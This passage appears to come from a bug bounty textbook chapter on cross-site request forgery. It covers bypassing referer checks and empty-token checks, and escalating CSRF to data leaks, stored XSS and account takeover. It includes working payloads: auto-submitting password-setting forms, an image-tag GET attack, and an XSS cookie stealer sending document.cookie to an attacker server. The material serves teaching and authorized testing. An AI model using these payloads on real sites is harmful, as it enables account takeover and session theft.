				You can also try to bypass the logic check used to validate the referer URL. Let’s say the application looks for the string <code>"example.com"</code> in the referer URL, and if the referer URL contains that string, the application treats the request as legitimate. Otherwise, it rejects the request:</p>
			<pre><code>def validate_referer(): if request.referer: if ("example.com" in request.referer): pass else: throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action(): validate_referer() execute_action()</code></pre>
			<p>In this case, you can bypass the referer check by placing the victim domain name in the referer URL as a subdomain. You can achieve this by creating a subdomain named after the victim’s domain, and then hosting the malicious HTML on that subdomain. Your request would look like this:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;<b>Referer: example.com.attacker.com</b>
(POST request body)
new_password=abc123</code></pre>
			<p>You can also try placing the victim domain name in the referer URL as a pathname. You can do so by creating a file with the name of the target’s domain and hosting your HTML page there:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;<b>Referer: attacker.com/example.com</b><span epub:type="pagebreak" id="Page_170" title="170"/>(POST request body)
new_password=abc123</code></pre>
			<p>After you’ve uploaded your HTML page at the correct location, load that page and see if the state-changing action was executed.</p>
			<h3 id="h2-501546c09-0009">Bypass CSRF Protection by Using XSS</h3>
			<p>
				In addition, as I mentioned in <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>, any XSS vulnerability will defeat CSRF protections, because XSS will allow attackers to steal the legitimate CSRF token and then craft forged requests by using <code>XMLHttpRequest</code>. Often, attackers will find XSS as the starting point to launch CSRFs to take over admin accounts.</p>
			<h2 id="h1-501546c09-0005">Escalating the Attack</h2>
			<p>After you’ve found a CSRF vulnerability, don’t just report it right away! Here are a few ways you can escalate CSRFs into severe security issues to maximize the impact of your report. Often, you need to use a combination of CSRF and other minor design flaws to discover these.</p>
			<h3 id="h2-501546c09-0010">Leak User Information by Using CSRF</h3>
			<p>CSRF can sometimes cause information leaks as a side effect. Applications often send or disclose information according to user preferences. If you can change these settings via CSRF, you can pave the way for sensitive information disclosures.</p>
			<p>
				For example, let’s say the <em>example.com</em> web application sends monthly billing emails to a user-designated email address. These emails contain the users’ billing information, including street addresses, phone numbers, and credit card information. The email address to which these billing emails are sent can be changed via the following request:</p>
			<pre><code>POST /change_billing_email
Host: example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
email=NEW_EMAIL&amp;csrf_token=871caef0757a4ac9691aceb9aad8b65b</code></pre>
			<p>
				Unfortunately, the CSRF validation on this endpoint is broken, and the server accepts a blank token. The request would succeed even if the <code>csrf_token</code> field is left empty:</p>
			<pre><code>POST /change_billing_email
Host: example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
email=NEW_EMAIL&amp;<b>csrf_token=</b></code></pre>
			<p><span epub:type="pagebreak" id="Page_171" title="171"/>An attacker could make a victim user send this request via CSRF to change the destination of their billing emails:</p>
			<pre><code>POST /change_billing_email
Host: example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
email=<b>ATTACKER_EMAIL</b>&amp;csrf_token=</code></pre>
			<p>All future billing emails would then be sent to the attacker’s email address until the victim notices the unauthorized change. Once the billing email is sent to the attacker’s email address, the attacker can collect sensitive information, such as street addresses, phone numbers, and credit card information associated with the account.</p>
			<h3 id="h2-501546c09-0011">Create Stored Self-XSS by Using CSRF</h3>
			<p>
				Remember from <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span> that self-XSS is a kind of XSS attack that requires the victim to input the XSS payload. These vulnerabilities are almost always considered a nonissue because they’re too difficult to exploit; doing so requires a lot of action from the victim’s part, and thus you’re unlikely to succeed. However, when you combine CSRF with self-XSS, you can often turn the self-XSS into stored XSS.</p>
			<p>
				For example, let’s say that <em>example.com</em>’s financial subdomain, <em>finance.example.com</em>, gives users the ability to create nicknames for each of their linked bank accounts. The account nickname field is vulnerable to self-XSS: there is no sanitization, validation, or escaping for user input on the field. However, only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.</p>
			<p>However, the endpoint used to change the account nicknames is vulnerable to CSRF. The application doesn’t properly validate the existence of the CSRF token, so simply omitting the token parameter in the request will bypass CSRF protection. For example, this request would fail, because it contains the wrong token:</p>
			<pre><code>POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
account=0
&amp;nickname="&lt;script&gt;document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;&lt;/script&gt;"
&amp;<b>csrf_token=WRONG_TOKEN</b></code></pre>
			<p>But this request, with no token at all, would succeed:</p>
			<pre><code>POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;<span epub:type="pagebreak" id="Page_172" title="172"/>(POST request body)
account=0
&amp;nickname="&lt;script&gt;document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;&lt;/script&gt;"</code></pre>
			<p>This request will change the user’s account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they’ll trigger the XSS.</p>
			<h3 id="h2-501546c09-0012">Take Over User Accounts by Using CSRF</h3>
			<p>Sometimes CSRF can even lead to account takeover. These situations aren’t uncommon, either; account takeover issues occur when a CSRF vulnerability exists in critical functionality, like the code that creates a password, changes the password, changes the email address, or resets the password.</p>
			<p>
				For example, let’s say that in addition to signing up by using an email address and password, <em>example.com</em> also allows users to sign up via their social media accounts. If a user chooses this option, they’re not required to create a password, as they can simply log in via their linked account. But to give users another option, those who’ve signed up via social media can set a new password via the following request:</p>
			<pre><code>POST /set_password
Host: example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
password=XXXXX&amp;csrf_token=871caef0757a4ac9691aceb9aad8b65b</code></pre>
			<p>Since the user signed up via their social media account, they don’t need to provide an old password to set the new password, so if CSRF protection fails on this endpoint, an attacker would have the ability to set a password for anyone who signed up via their social media account and hasn’t yet done so.</p>
			<p>Let’s say the application doesn’t validate the CSRF token properly and accepts an empty value. The following request will set a password for anyone who doesn’t already have one set:</p>
			<pre><code>POST /set_password
Host: example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>;
(POST request body)
password=<b>XXXXX&amp;csrf_token=</b></code></pre>
			<p>Now all an attacker has to do is to post a link to this HTML page on pages frequented by users of the site, and they can automatically assign the password of any user who visits the malicious page:</p>
			<pre><code>&lt;html&gt; &lt;form method="POST" action="https://email.example.com/set_password" id="csrf-form"&gt; &lt;input type="text" name="new_password" value="this_account_is_now_mine"&gt;<span epub:type="pagebreak" id="Page_173" title="173"/>    &lt;input type="text" name="csrf_token" value=""&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>
			<p>
				After that, the attacker is free to log in as any of the affected victims with the newly assigned password <code>this_account_is_now_mine</code>.</p>
			<p>While the majority of CSRFs that I have encountered were low-severity issues, sometimes a CSRF on a critical endpoint can lead to severe consequences.</p>
			<h2 id="h1-501546c09-0006">Delivering the CSRF Payload</h2>
			<p>Quite often in bug bounty reports, you’ll need to show companies that attackers can reliably deliver a CSRF payload. What options do attackers have to do so?</p>
			<p>
				The first and simplest option of delivering a CSRF payload is to trick users into visiting an external malicious site. For example, let’s say <em>example.com</em> has a forum that users frequent. In this case, attackers can post a link like this on the forum to encourage users to visit their page:</p>
Visit this page to get a discount on your <em>example.com</em> subscription: <em>https://example.attacker.com</em><p>
				And on <em>example.attacker.com</em>, the attacker can host an auto-submitting form to execute the CSRF:</p>
			<pre><code>&lt;html&gt; &lt;form method="POST" action="https://email.example.com/set_password" id="csrf-form"&gt; &lt;input type="text" name="new_password" value="this_account_is_now_mine"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>
			<p>For CSRFs that you could execute via a GET request, attackers can often embed the request as an image directly—for example, as an image posted to a forum. This way, any user who views the forum page would be affected:</p>
			<pre><code>&lt;img src="https://email.example.com/set_password?new_password=this_account_is_now_mine"&gt;</code></pre>
			<p>Finally, attackers can deliver a CSRF payload to a large audience by exploiting stored XSS. If the forum comment field suffers from this vulnerability, an attacker can submit a stored-XSS payload there to make any forum visitor execute the attacker’s malicious script. In the malicious script, the attacker can include code that sends the CSRF payload:</p>
			<pre><code>&lt;script&gt; document.body.innerHTML += " &lt;form method="POST" action="https://email.example.com/set_password" id="csrf-form"&gt;<span epub:type="pagebreak" id="Page_174" title="174"/>      &lt;input type="text" name="new_password" value="this_account_is_now_mine"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt;"; document.getElementById("csrf-form").submit();
&lt;/script&gt;</code></pre>
			<p>This piece of JavaScript code adds our exploit form to the user’s current page and then auto-submits that form.</p>
			<p>
				Using these delivery methods, you can show companies how attackers can realistically attack many users and demonstrate the maximum impact of your CSRF vulnerability. If you have Burp Suite Pro, or use the ZAP proxy, you can also take advantage of their CSRF POC-generation functionality. For more information, search the tools’ documentation for <em>CSRF POC generation</em>. You can also keep a POC script you wrote yourself and insert a target site’s URLs into the script every time you test a new target.</p>
			<h2 id="h1-501546c09-0007">Finding Your First CSRF!</h2>
			<p>Armed with this knowledge about CSRF bugs, bypassing CSRF protection, and escalating CSRF vulnerabilities, you’re now ready to look for your first CSRF vulnerability! Hop on a bug bounty program and find your first CSRF by following the steps covered in this chapter:</p>
			<ol class="decimal">
				<li value="1">Spot the state-changing actions on the application and keep a note on their locations and functionality.</li>
				<li value="2">Check these functionalities for CSRF protection. If you can’t spot any protections, you might have found a vulnerability!</li>
				<li value="3">If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.</li>
				<li value="4">Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed.</li>
				<li value="5">Think of strategies for delivering your payload to end users.</li>
				<li value="6">Draft your first CSRF report!</li>
			</ol>
		</section>
	</body>
</html>